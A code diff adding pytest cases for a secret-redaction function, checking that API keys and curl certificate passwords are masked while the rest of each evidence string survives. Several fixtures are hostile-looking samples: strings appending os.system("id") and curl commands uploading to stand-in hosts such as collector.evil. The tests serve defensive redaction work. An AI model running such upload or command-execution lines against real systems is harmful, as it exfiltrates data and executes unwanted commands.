@@ -1515,6 +1515,62 @@ def test_dotted_benign_url_query_key_is_preserved() -> None:
     assert redact_evidence_string(text, max_chars=1000) == text
 
 
+@pytest.mark.parametrize("key", ["api.key", "aws.secret.access.key"])
+def test_dotted_sensitive_assignment_keys_are_redacted(key: str) -> None:
+    text = f'{key}=DOTTED_ASSIGNMENT_SECRET os.system("id")'
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "DOTTED_ASSIGNMENT_SECRET" not in redacted
+    assert f"{key}={REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "os.system" in redacted
+
+
+def test_dotted_benign_assignment_key_is_preserved() -> None:
+    text = "api.key.hint=public"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize(
+    ("text", "context"),
+    [
+        (
+            'os.environ.setdefault("API_KEY", "FUNCTION_ARGUMENT_SECRET"); os.system("id")',
+            'os.environ.setdefault("API_KEY", "<redacted>")',
+        ),
+        (
+            "config.get('aws.secret.access.key', 'FUNCTION_ARGUMENT_SECRET'); os.system('id')",
+            "config.get('aws.secret.access.key', \"<redacted>\")",
+        ),
+        (
+            'os.environ.setdefault("API_KEY", """FUNCTION_ARGUMENT_SECRET"""); os.system("id")',
+            'os.environ.setdefault("API_KEY", "<redacted>")',
+        ),
+        (
+            'os.environ.setdefault("API_KEY", "FUNCTION" "_ARGUMENT_SECRET"); os.system("id")',
+            'os.environ.setdefault("API_KEY", "<redacted>")',
+        ),
+        (
+            'helper("API_KEY", "public" if enabled else "FUNCTION_ARGUMENT_SECRET", "mode"); os.system("id")',
+            'helper("API_KEY", "<redacted>", "mode")',
+        ),
+    ],
+)
+def test_sensitive_key_value_function_arguments_are_redacted(text: str, context: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "FUNCTION_ARGUMENT_SECRET" not in redacted
+    assert context in redacted
+    assert "os.system" in redacted
+
+
+def test_benign_key_value_function_arguments_are_preserved() -> None:
+    text = 'config.get("api_key_hint", "public"); os.system("id")'
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
 @pytest.mark.parametrize(
     ("text", "secret", "command"),
     [
@@ -1558,6 +1614,48 @@ def test_documented_process_password_options_are_redacted(text: str, secret: str
     assert command in redacted
     assert "collector.evil.example" in redacted
     assert REDACTED_EVIDENCE_VALUE in redacted
+
+
+@pytest.mark.parametrize(
+    ("text", "secret", "context"),
+    [
+        (
+            "curl --cert client.pem:CERT_PASSWORD https://collector.evil/upload",
+            "CERT_PASSWORD",
+            "--cert client.pem:<redacted>",
+        ),
+        (
+            'curl -E "client cert.pem:CERT_PASSWORD" https://collector.evil/upload',
+            "CERT_PASSWORD",
+            '-E "client cert.pem:<redacted>"',
+        ),
+        (
+            "curl --proxy-cert=proxy.pem:PROXY_CERT_PASSWORD https://collector.evil/upload",
+            "PROXY_CERT_PASSWORD",
+            "--proxy-cert=proxy.pem:<redacted>",
+        ),
+    ],
+)
+def test_curl_certificate_passwords_are_redacted(text: str, secret: str, context: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert secret not in redacted
+    assert context in redacted
+    assert "collector.evil" in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "curl --cert client.pem https://collector.evil/upload",
+        "curl --cert-type PEM https://collector.evil/upload",
+        'curl -E "client cert.pem" https://collector.evil/upload',
+        r"curl --cert C:\client.pem https://collector.evil/upload",
+        r'curl -E "C:\client cert.pem" https://collector.evil/upload',
+    ],
+)
+def test_curl_certificate_options_without_passwords_are_preserved(text: str) -> None:
+    assert redact_evidence_string(text, max_chars=1000) == text
 
 
 @pytest.mark.parametrize(
